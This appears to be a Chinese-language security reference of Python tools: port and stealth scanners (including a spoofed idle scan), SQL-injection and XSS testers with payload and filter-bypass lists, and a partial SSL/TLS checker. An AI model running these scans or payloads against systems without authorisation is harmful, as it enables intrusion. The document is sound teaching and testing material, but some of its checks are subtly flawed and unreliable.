# 网络安全参考文档

## 网络安全概述

### 网络安全定义
网络安全是保护计算机网络和数据免受未经授权的访问、使用、披露、破坏、修改或销毁的实践。它涉及硬件、软件和人员的安全措施。

### 网络安全层次
1. **物理层安全**: 保护物理设备和基础设施
2. **网络层安全**: 保护网络通信和连接
3. **系统层安全**: 保护操作系统和系统软件
4. **应用层安全**: 保护应用程序和服务
5. **数据层安全**: 保护存储和传输的数据
6. **人员层安全**: 保护组织的人员和流程

### 网络安全威胁类型
- **被动威胁**: 窃听、流量分析
- **主动威胁**: 伪装、重放、修改、拒绝服务
- **内部威胁**: 恶意内部人员、无意的安全违规
- **外部威胁**: 黑客攻击、恶意软件、网络钓鱼

## 网络扫描技术

### 端口扫描

#### Nmap端口扫描
```python
import nmap
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import time

class PortScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.open_ports = []
        self.closed_ports = []
        self.filtered_ports = []
    
    def nmap_scan(self, target, port_range='1-1000', scan_type='-sS'):
        """使用Nmap进行端口扫描"""
        try:
            print(f"开始扫描 {target} 的端口 {port_range}...")
            
            # 执行扫描
            self.nm.scan(target, port_range, arguments=scan_type)
            
            # 解析结果
            for host in self.nm.all_hosts():
                print(f"\n主机: {host} ({self.nm[host].hostname()})")
                print(f"状态: {self.nm[host].state()}")
                
                for proto in self.nm[host].all_protocols():
                    print(f"\n协议: {proto}")
                    
                    ports = self.nm[host][proto].keys()
                    for port in sorted(ports):
                        state = self.nm[host][proto][port]['state']
                        service = self.nm[host][proto][port]['name']
                        version = self.nm[host][proto][port]['version']
                        
                        print(f"端口 {port}/{proto}: {state} - {service} {version}")
                        
                        if state == 'open':
                            self.open_ports.append(port)
                        elif state == 'closed':
                            self.closed_ports.append(port)
                        elif state == 'filtered':
                            self.filtered_ports.append(port)
            
            return {
                'open_ports': self.open_ports,
                'closed_ports': self.closed_ports,
                'filtered_ports': self.filtered_ports
            }
            
        except Exception as e:
            print(f"扫描失败: {e}")
            return None
    
    def tcp_connect_scan(self, target, ports, timeout=3):
        """TCP连接扫描"""
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    print(f"端口 {port} 开放")
                else:
                    print(f"端口 {port} 关闭")
                    
            except Exception as e:
                print(f"扫描端口 {port} 时出错: {e}")
        
        # 使用线程池加速扫描
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(scan_port, ports)
        
        return open_ports
    
    def syn_scan(self, target, ports):
        """SYN扫描（需要root权限）"""
        try:
            # 使用nmap的SYN扫描
            return self.nmap_scan(target, ','.join(map(str, ports)), '-sS')
        except Exception as e:
            print(f"SYN扫描失败: {e}")
            return None
    
    def udp_scan(self, target, ports):
        """UDP扫描"""
        try:
            # UDP扫描通常较慢
            return self.nmap_scan(target, ','.join(map(str, ports)), '-sU')
        except Exception as e:
            print(f"UDP扫描失败: {e}")
            return None
    
    def service_detection(self, target, ports):
        """服务版本检测"""
        try:
            # 使用-sV参数进行版本检测
            self.nm.scan(target, ','.join(map(str, ports)), arguments='-sV')
            
            services = {}
            for host in self.nm.all_hosts():
                for proto in self.nm[host].all_protocols():
                    for port in self.nm[host][proto].keys():
                        if self.nm[host][proto][port]['state'] == 'open':
                            service_info = {
                                'name': self.nm[host][proto][port]['name'],
                                'product': self.nm[host][proto][port]['product'],
                                'version': self.nm[host][proto][port]['version'],
                                'extrainfo': self.nm[host][proto][port]['extrainfo']
                            }
                            services[port] = service_info
            
            return services
            
        except Exception as e:
            print(f"服务检测失败: {e}")
            return None
    
    def os_detection(self, target):
        """操作系统检测"""
        try:
            # 使用-O参数进行OS检测
            self.nm.scan(target, arguments='-O')
            
            for host in self.nm.all_hosts():
                if 'osmatch' in self.nm[host]:
                    for osmatch in self.nm[host]['osmatch']:
                        print(f"操作系统: {osmatch['name']}")
                        print(f"准确性: {osmatch['accuracy']}%")
                        print(f"类型: {osmatch['osclass']}")
            
        except Exception as e:
            print(f"OS检测失败: {e}")

# 使用示例
scanner = PortScanner()

# 扫描本地主机
target = '127.0.0.1'
ports = list(range(1, 1025))

# Nmap扫描
results = scanner.nmap_scan(target, '1-1000', '-sS')

# TCP连接扫描
open_ports = scanner.tcp_connect_scan(target, [22, 80, 443, 8080])

# 服务检测
services = scanner.service_detection(target, [22, 80, 443])
print(f"检测到的服务: {services}")
```

#### 高级扫描技术
```python
import scapy.all as scapy
import time
import threading
from queue import Queue

class AdvancedScanner:
    def __init__(self):
        self.results = {}
        self.timeout = 2
    
    def syn_half_open_scan(self, target_ip, ports):
        """SYN半开放扫描"""
        results = {}
        
        for port in ports:
            # 构造SYN包
            syn_packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="S")
            
            # 发送SYN包并接收响应
            response = scapy.sr1(syn_packet, timeout=self.timeout, verbose=0)
            
            if response:
                if response.haslayer(scapy.TCP):
                    tcp_layer = response.getlayer(scapy.TCP)
                    
                    if tcp_layer.flags == 0x12:  # SYN+ACK
                        # 发送RST包重置连接
                        rst_packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="R")
                        scapy.send(rst_packet, verbose=0)
                        results[port] = 'open'
                    elif tcp_layer.flags == 0x14:  # RST
                        results[port] = 'closed'
                    else:
                        results[port] = 'filtered'
                else:
                    results[port] = 'filtered'
            else:
                results[port] = 'filtered'
        
        return results
    
    def xmas_scan(self, target_ip, ports):
        """XMAS扫描"""
        results = {}
        
        for port in ports:
            # 构造XMAS包 (FIN, PSH, URG)
            xmas_packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="FPU")
            
            response = scapy.sr1(xmas_packet, timeout=self.timeout, verbose=0)
            
            if response:
                if response.haslayer(scapy.TCP):
                    tcp_layer = response.getlayer(scapy.TCP)
                    if tcp_layer.flags == 0x14:  # RST
                        results[port] = 'closed'
                    else:
                        results[port] = 'open'
                else:
                    results[port] = 'filtered'
            else:
                results[port] = 'open|filtered'
        
        return results
    
    def null_scan(self, target_ip, ports):
        """NULL扫描"""
        results = {}
        
        for port in ports:
            # 构造NULL包 (无标志位)
            null_packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="")
            
            response = scapy.sr1(null_packet, timeout=self.timeout, verbose=0)
            
            if response:
                if response.haslayer(scapy.TCP):
                    tcp_layer = response.getlayer(scapy.TCP)
                    if tcp_layer.flags == 0x14:  # RST
                        results[port] = 'closed'
                    else:
                        results[port] = 'open'
                else:
                    results[port] = 'filtered'
            else:
                results[port] = 'open|filtered'
        
        return results
    
    def fin_scan(self, target_ip, ports):
        """FIN扫描"""
        results = {}
        
        for port in ports:
            # 构造FIN包
            fin_packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=port, flags="F")
            
            response = scapy.sr1(fin_packet, timeout=self.timeout, verbose=0)
            
            if response:
                if response.haslayer(scapy.TCP):
                    tcp_layer = response.getlayer(scapy.TCP)
                    if tcp_layer.flags == 0x14:  # RST
                        results[port] = 'closed'
                    else:
                        results[port] = 'open'
                else:
                    results[port] = 'filtered'
            else:
                results[port] = 'open|filtered'
        
        return results
    
    def idle_scan(self, target_ip, zombie_ip, ports):
        """空闲扫描（需要僵尸主机）"""
        results = {}
        
        # 获取僵尸主机的IP ID
        ip_id_probe = scapy.IP(dst=zombie_ip) / scapy.TCP(dport=80, flags="S")
        response1 = scapy.sr1(ip_id_probe, timeout=self.timeout, verbose=0)
        
        if response1:
            initial_ip_id = response1.getlayer(scapy.IP).id
            
            for port in ports:
                # 伪造源IP为僵尸主机向目标发送SYN包
                spoofed_syn = scapy.IP(src=zombie_ip, dst=target_ip) / scapy.TCP(dport=port, flags="S")
                scapy.send(spoofed_syn, verbose=0)
                
                # 再次探测僵尸主机的IP ID
                response2 = scapy.sr1(ip_id_probe, timeout=self.timeout, verbose=0)
                
                if response2:
                    new_ip_id = response2.getlayer(scapy.IP).id
                    
                    # 如果IP ID增加了1，说明目标端口开放
                    if new_ip_id == initial_ip_id + 2:
                        results[port] = 'open'
                    else:
                        results[port] = 'closed'
                    
                    initial_ip_id = new_ip_id
                else:
                    results[port] = 'filtered'
        
        return results

# 使用示例
advanced_scanner = AdvancedScanner()

# 注意：这些扫描需要root权限
# target = '192.168.1.1'
# ports = [22, 80, 443, 8080]

# SYN半开放扫描
# syn_results = advanced_scanner.syn_half_open_scan(target, ports)

# XMAS扫描
# xmas_results = advanced_scanner.xmas_scan(target, ports)

# NULL扫描
# null_results = advanced_scanner.null_scan(target, ports)
```

## Web安全测试

### SQL注入检测

#### SQL注入测试工具
```python
import requests
import time
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import warnings
warnings.filterwarnings('ignore')

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerable_params = []
        self.error_patterns = [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark",
            r"microsoft ole db provider",
            r"oracle error",
            r"postgresql error",
            r"sql syntax error",
            r"sqlite_exception",
            r"sqlstate[0-9]{5}",
            r"mysql_fetch_array\(\)",
            r"mysql_num_rows\(\)"
        ]
    
    def test_get_sql_injection(self, params=None):
        """测试GET参数的SQL注入"""
        if params is None:
            # 自动提取表单参数
            params = self.extract_form_parameters()
        
        sql_payloads = [
            "'", '"', "''", '""', "\\", "\\\\", 
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR '1'='1' --", "\" OR \"1\"=\"1\" --",
            "' OR '1'='1' /*", "\" OR \"1\"=\"1\" /*",
            "admin'--", "admin\"--",
            "1' OR '1'='1", "1\" OR \"1\"=\"1",
            "true", "false", "1=1", "1=2"
        ]
        
        for param in params:
            for payload in sql_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # 检查SQL错误
                    if self.check_sql_errors(response.text):
                        self.vulnerable_params.append({
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'evidence': self.get_error_evidence(response.text)
                        })
                        print(f"[!] 发现SQL注入漏洞: {param} = {payload}")
                        break
                        
                except Exception as e:
                    print(f"测试参数 {param} 时出错: {e}")
        
        return self.vulnerable_params
    
    def test_post_sql_injection(self, form_data, action_url=None):
        """测试POST参数的SQL注入"""
        if action_url is None:
            action_url = self.target_url
        
        sql_payloads = [
            "'", '"', "''", '""', "\\", "\\\\", 
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR '1'='1' --", "\" OR \"1\"=\"1\" --",
            "admin'--", "admin\"--"
        ]
        
        for param in form_data.keys():
            original_value = form_data[param]
            
            for payload in sql_payloads:
                test_data = form_data.copy()
                test_data[param] = payload
                
                try:
                    response = self.session.post(action_url, data=test_data, timeout=10)
                    
                    # 检查SQL错误
                    if self.check_sql_errors(response.text):
                        self.vulnerable_params.append({
                            'parameter': param,
                            'payload': payload,
                            'url': action_url,
                            'method': 'POST',
                            'evidence': self.get_error_evidence(response.text)
                        })
                        print(f"[!] 发现SQL注入漏洞: {param} = {payload}")
                        break
                        
                except Exception as e:
                    print(f"测试参数 {param} 时出错: {e}")
            
            # 恢复原始值
            form_data[param] = original_value
        
        return self.vulnerable_params
    
    def check_sql_errors(self, response_text):
        """检查SQL错误模式"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def get_error_evidence(self, response_text):
        """获取错误证据"""
        for pattern in self.error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return ""
    
    def extract_form_parameters(self):
        """提取表单参数"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            params = []
            
            for form in forms:
                inputs = form.find_all('input')
                for input_tag in inputs:
                    if input_tag.get('name'):
                        params.append(input_tag.get('name'))
            
            return list(set(params))  # 去重
            
        except Exception as e:
            print(f"提取表单参数失败: {e}")
            return []
    
    def test_time_based_blind_sql(self, params=None):
        """测试基于时间的盲注"""
        if params is None:
            params = self.extract_form_parameters()
        
        time_payloads = [
            "' AND SLEEP(5) --",
            "\" AND SLEEP(5) --",
            "1' AND SLEEP(5) --",
            "1\" AND SLEEP(5) --",
            "'; WAITFOR DELAY '00:00:05' --",
            "\"; WAITFOR DELAY '00:00:05' --"
        ]
        
        for param in params:
            for payload in time_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    
                    if response_time > 4:  # 响应时间超过4秒
                        self.vulnerable_params.append({
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'type': 'Time-based Blind SQLi',
                            'response_time': response_time
                        })
                        print(f"[!] 发现时间盲注漏洞: {param} = {payload} (响应时间: {response_time:.2f}s)")
                        break
                        
                except Exception as e:
                    print(f"测试参数 {param} 时出错: {e}")
        
        return self.vulnerable_params
    
    def test_boolean_based_blind_sql(self, params=None):
        """测试基于布尔的盲注"""
        if params is None:
            params = self.extract_form_parameters()
        
        true_payloads = [
            "' AND '1'='1",
            "\" AND \"1\"=\"1",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1"
        ]
        
        false_payloads = [
            "' AND '1'='2",
            "\" AND \"1\"=\"2",
            "1' AND '1'='2",
            "1\" AND \"1\"=\"2"
        ]
        
        for param in params:
            true_responses = []
            false_responses = []
            
            # 测试真条件
            for payload in true_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                try:
                    response = self.session.get(test_url, timeout=10)
                    true_responses.append(len(response.text))
                except:
                    true_responses.append(0)
            
            # 测试假条件
            for payload in false_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                try:
                    response = self.session.get(test_url, timeout=10)
                    false_responses.append(len(response.text))
                except:
                    false_responses.append(0)
            
            # 比较响应长度差异
            avg_true = sum(true_responses) / len(true_responses) if true_responses else 0
            avg_false = sum(false_responses) / len(false_responses) if false_responses else 0
            
            if abs(avg_true - avg_false) > 100:  # 响应长度差异显著
                self.vulnerable_params.append({
                    'parameter': param,
                    'url': self.target_url,
                    'method': 'GET',
                    'type': 'Boolean-based Blind SQLi',
                    'avg_true_response': avg_true,
                    'avg_false_response': avg_false
                })
                print(f"[!] 发现布尔盲注漏洞: {param}")
        
        return self.vulnerable_params
    
    def generate_report(self):
        """生成测试报告"""
        if not self.vulnerable_params:
            return "未发现SQL注入漏洞"
        
        report = "SQL注入测试报告\n"
        report += "=" * 50 + "\n\n"
        
        for i, vuln in enumerate(self.vulnerable_params, 1):
            report += f"漏洞 {i}:\n"
            report += f"  参数: {vuln['parameter']}\n"
            report += f"  方法: {vuln['method']}\n"
            report += f"  URL: {vuln['url']}\n"
            report += f"  载荷: {vuln['payload']}\n"
            
            if 'evidence' in vuln:
                report += f"  证据: {vuln['evidence']}\n"
            if 'type' in vuln:
                report += f"  类型: {vuln['type']}\n"
            if 'response_time' in vuln:
                report += f"  响应时间: {vuln['response_time']:.2f}s\nn"
            
            report += "\n"
        
        return report

# 使用示例
# tester = SQLInjectionTester("http://example.com/login.php")

# 测试GET参数
# get_vulns = tester.test_get_sql_injection(['username', 'password'])

# 测试POST参数
# form_data = {'username': 'test', 'password': 'test'}
# post_vulns = tester.test_post_sql_injection(form_data)

# 测试时间盲注
# time_vulns = tester.test_time_based_blind_sql()

# 测试布尔盲注
# bool_vulns = tester.test_boolean_based_blind_sql()

# 生成报告
# report = tester.generate_report()
# print(report)
```

### XSS跨站脚本检测

#### XSS测试工具
```python
import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings('ignore')

class XSSDetector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        
        # XSS载荷
        self.xss_payloads = [
            # 基础载荷
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            
            # 事件处理器
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            
            # 编码载荷
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # 短载荷
            "<script>alert(1)</script>",
            "<svg><script>alert(1)</script></svg>",
            "<iframe src=javascript:alert(1)>",
            
            # 过滤绕过
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            
            # DOM XSS
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            
            # 其他载荷
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert('XSS');--",
            "\";alert('XSS');--"
        ]
    
    def test_reflected_xss(self, params=None):
        """测试反射型XSS"""
        if params is None:
            params = self.extract_form_parameters()
        
        for param in params:
            for payload in self.xss_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # 检查载荷是否在响应中反射
                    if self.check_payload_reflection(response.text, payload):
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'evidence': self.get_payload_context(response.text, payload)
                        })
                        print(f"[!] 发现反射型XSS: {param} = {payload}")
                        break
                        
                except Exception as e:
                    print(f"测试参数 {param} 时出错: {e}")
        
        return self.vulnerabilities
    
    def test_stored_xss(self, form_data, action_url=None):
        """测试存储型XSS"""
        if action_url is None:
            action_url = self.target_url
        
        for param in form_data.keys():
            original_value = form_data[param]
            
            for payload in self.xss_payloads:
                test_data = form_data.copy()
                test_data[param] = payload
                
                try:
                    # 提交包含XSS载荷的数据
                    response = self.session.post(action_url, data=test_data, timeout=10)
                    
                    # 检查后续页面是否包含XSS载荷
                    if self.check_payload_reflection(response.text, payload):
                        self.vulnerabilities.append({
                            'type': 'Stored XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': action_url,
                            'method': 'POST',
                            'evidence': self.get_payload_context(response.text, payload)
                        })
                        print(f"[!] 发现存储型XSS: {param} = {payload}")
                        
                        # 恢复原始值并继续测试其他载荷
                        form_data[param] = original_value
                        break
                        
                except Exception as e:
                    print(f"测试参数 {param} 时出错: {e}")
            
            # 恢复原始值
            form_data[param] = original_value
        
        return self.vulnerabilities
    
    def test_dom_xss(self, params=None):
        """测试DOM型XSS"""
        if params is None:
            params = self.extract_form_parameters()
        
        dom_payloads = [
            "#<img src=x onerror=alert(1)>",
            "#<script>alert(1)</script>",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(window.location.href)</script>"
        ]
        
        for param in params:
            for payload in dom_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # 检查DOM操作
                    if self.check_dom_xss(response.text, payload):
                        self.vulnerabilities.append({
                            'type': 'DOM XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'evidence': 'DOM-based XSS detected'
                        })
                        print(f"[!] 发现DOM型XSS: {param} = {payload}")
                        break
                        
                except Exception as e:
                    print(f"测试参数 {param} 时出错: {e}")
        
        return self.vulnerabilities
    
    def test_xss_in_headers(self):
        """测试HTTP头中的XSS"""
        header_payloads = [
            "<script>alert(1)</script>",
            "';alert(1);//",
            "<img src=x onerror=alert(1)>"
        ]
        
        headers_to_test = ['User-Agent', 'Referer', 'Cookie']
        
        for header in headers_to_test:
            for payload in header_payloads:
                headers = {header: payload}
                
                try:
                    response = self.session.get(self.target_url, headers=headers, timeout=10)
                    
                    if self.check_payload_reflection(response.text, payload):
                        self.vulnerabilities.append({
                            'type': 'HTTP Header XSS',
                            'header': header,
                            'payload': payload,
                            'url': self.target_url,
                            'method': 'GET',
                            'evidence': self.get_payload_context(response.text, payload)
                        })
                        print(f"[!] 发现HTTP头XSS: {header} = {payload}")
                        break
                        
                except Exception as e:
                    print(f"测试HTTP头 {header} 时出错: {e}")
        
        return self.vulnerabilities
    
    def check_payload_reflection(self, response_text, payload):
        """检查载荷是否在响应中反射"""
        # 直接检查
        if payload in response_text:
            return True
        
        # 检查编码后的载荷
        encoded_payload = requests.utils.quote(payload)
        if encoded_payload in response_text:
            return True
        
        # 检查部分载荷
        if "<script>" in response_text and "alert" in response_text:
            return True
        
        if "onerror=" in response_text or "onload=" in response_text:
            return True
        
        # 检查JavaScript代码
        if re.search(r'alert\s*\(', response_text, re.IGNORECASE):
            return True
        
        return False
    
    def check_dom_xss(self, response_text, payload):
        """检查DOM型XSS"""
        # 检查常见的DOM操作
        dom_patterns = [
            r'document\.write\s*\(',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'document\.URL',
            r'document\.documentElement',
            r'window\.location'
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def get_payload_context(self, response_text, payload):
        """获取载荷的上下文"""
        # 简单的上下文提取
        if payload in response_text:
            index = response_text.find(payload)
            start = max(0, index - 50)
            end = min(len(response_text), index + len(payload) + 50)
            return response_text[start:end]
        
        return "Context not found"
    
    def extract_form_parameters(self):
        """提取表单参数"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            params = []
            
            for form in forms:
                inputs = form.find_all('input')
                for input_tag in inputs:
                    if input_tag.get('name'):
                        params.append(input_tag.get('name'))
            
            return list(set(params))
            
        except Exception as e:
            print(f"提取表单参数失败: {e}")
            return []
    
    def test_xss_filters(self, param):
        """测试XSS过滤器"""
        filter_bypass_payloads = [
            # 大小写混合
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            
            # 重复字符
            "<scrscriptipt>alert(1)</scrscriptipt>",
            
            # 编码绕过
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            
            # 注释绕过
            "<script>alert(1)</script>",
            "<script>/*comment*/alert(1)</script>",
            
            # 其他绕过
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>"
        ]
        
        bypass_results = []
        
        for payload in filter_bypass_payloads:
            test_url = f"{self.target_url}?{param}={payload}"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if self.check_payload_reflection(response.text, payload):
                    bypass_results.append({
                        'payload': payload,
                        'bypassed': True,
                        'evidence': self.get_payload_context(response.text, payload)
                    })
                    print(f"[*] 过滤器绕过成功: {payload}")
                else:
                    bypass_results.append({
                        'payload': payload,
                        'bypassed': False
                    })
                    
            except Exception as e:
                print(f"测试载荷 {payload} 时出错: {e}")
        
        return bypass_results
    
    def generate_report(self):
        """生成XSS测试报告"""
        if not self.vulnerabilities:
            return "未发现XSS漏洞"
        
        report = "XSS测试报告\n"
        report += "=" * 50 + "\n\n"
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            report += f"漏洞 {i}:\n"
            report += f"  类型: {vuln['type']}\n"
            report += f"  参数: {vuln.get('parameter', vuln.get('header', 'N/A'))}\n"
            report += f"  方法: {vuln['method']}\n"
            report += f"  URL: {vuln['url']}\n"
            report += f"  载荷: {vuln['payload']}\n"
            report += f"  证据: {vuln['evidence']}\n\n"
        
        return report

# 使用示例
# xss_detector = XSSDetector("http://example.com/search.php")

# 测试反射型XSS
# reflected_vulns = xss_detector.test_reflected_xss(['q', 'search'])

# 测试存储型XSS
# form_data = {'comment': 'test', 'name': 'test'}
# stored_vulns = xss_detector.test_stored_xss(form_data)

# 测试DOM型XSS
# dom_vulns = xss_detector.test_dom_xss()

# 测试HTTP头XSS
# header_vulns = xss_detector.test_xss_in_headers()

# 测试过滤器绕过
# filter_results = xss_detector.test_xss_filters('search')

# 生成报告
# report = xss_detector.generate_report()
# print(report)
```

## 网络协议安全

### SSL/TLS安全检查

#### SSL/TLS配置检查器
```python
import ssl
import socket
import OpenSSL
from datetime import datetime
import warnings
warnings.filterwarnings('ignore')

class SSLTLSChecker:
    def __init__(self, hostname, port=443):
        self.hostname = hostname
        self.port = port
        self.results = {}
        
        # 不安全的协议版本
        self.insecure_protocols = [
            ssl.PROTOCOL_SSLv2,
            ssl.PROTOCOL_SSLv3,
            ssl.PROTOCOL_TLSv1,
            ssl.PROTOCOL_TLSv1_1
        ]
        
        # 推荐的加密套件
        self.recommended_ciphers = [
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256'
        ]
    
    def check_certificate(self):
        """检查SSL证书"""
        try:
            # 创建SSL上下文
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 连接并获取证书
            with socket.create_connection((self.hostname, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    cert_der = ssock.getpeercert(binary_form=True)
                    cert_pem = ssl.DER_cert_to_PEM_cert(cert_der)
                    cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert_pem)
                    
                    # 解析证书信息
                    cert_info = {
                        'subject': dict(x[0] for x in cert.get_subject().get_components()),
                        'issuer': dict(x[0] for x in cert.get_issuer().get_components()),
                        'version': cert.get_version(),
                        'serial_number': cert.get_serial_number(),
                        'not_before': cert.get_notBefore().decode('ascii'),
                        'not_after': cert.get_notAfter().decode('ascii'),
                        'signature_algorithm': cert.get_signature_algorithm().decode('ascii')
                    }
                    
                    # 检查证书有效期
                    not_before = datetime.strptime(cert_info['not_before'], '%Y%m%d%H%M%SZ')
                    not_after = datetime.strptime(cert_info['not_after'], '%Y%m%d%H%M%SZ')
                    now = datetime.now()
                    
                    cert_info['days_until_expiry'] = (not_after - now).days
                    cert_info['is_expired'] = now > not_after
                    cert_info['is_not_yet_valid'] = now < not_before
                    
                    # 检查证书强度
                    public_key = cert.get_pubkey()
                    key_size = public_key.bits()
                    cert_info['key_size'] = key_size
                    cert_info['key_algorithm'] = OpenSSL.crypto.TYPE_RSA if public_key.type() == OpenSSL.crypto.TYPE_RSA else OpenSSL.crypto.TYPE_DSA
                    
                    # 检查自签名证书
                    cert_info['is_self_signed'] = cert.get_subject() == cert.get_issuer()
                    
                    self.results['certificate'] = cert_info
                    
                    return cert_info
                    
        except Exception as e:
            self.results['certificate'] = {'error': str(e)}
            return None
    
    def check_protocols(self):
        """检查SSL/TLS协议支持"""
        protocol_results = {}
        
        # 测试各个协议版本
        protocols = {
            'SSLv2': ssl.PROTOCOL_SSLv2,
            'SSLv3': ssl.PROTOCOL_SSLv3,
            'TLSv1.0': ssl.PROTOCOL_TLSv1,
            'TLSv1.1': ssl.PROTOCOL_TLSv1_1,
            'TLSv1.2': ssl.PROTOCOL_TLSv1_2,
            'TLSv1.3': getattr(ssl, 'PROTOCOL_TLSv1_3', None)
        }
        
        for protocol_name, protocol_version in protocols.items():
            if protocol_version is None:
                continue
                
            try:
                # 创建特定协议的上下文
                context = ssl.SSLContext(protocol_version)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # 尝试连接
                with socket.create_connection((self.hostname, self.port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                        protocol_info = ssock.version()
                        protocol_results[protocol_name] = {
                            'supported': True,
                            'version': str(protocol_info) if protocol_info else 'Unknown'
                        }
                        
            except Exception as e:
                protocol_results[protocol_name] = {
                    'supported': False,
                    'error': str(e)
                }
        
        self.results['protocols'] = protocol_results
        return protocol_results
    
    def check_cipher_suites(self):
        """检查加密套件"""
        cipher_results = {}
        
        try:
            # 创建默认SSL上下文
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.hostname, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    cipher_info = ssock.cipher()
                    
                    if cipher_info:
                        cipher_results['current_cipher'] = {
                            'name': cipher_info[0],
                            'version': cipher_info[1],
                            'bits': cipher_info[2]
                        }
                        
                        # 检查是否为推荐的加密套件
                        cipher_name = cipher_info[0]
                        cipher_results['is_recommended'] = cipher_name in self.recommended_ciphers
                        
                        # 检查加密强度
                        key_bits = cipher_info[2]
                        cipher_results['key_strength'] = self.evaluate_key_strength(key_bits)
                    
        except Exception as e:
            cipher_results['error'] = str(e)
        
        self.results['cipher_suites'] = cipher_results
        return cipher_results
    
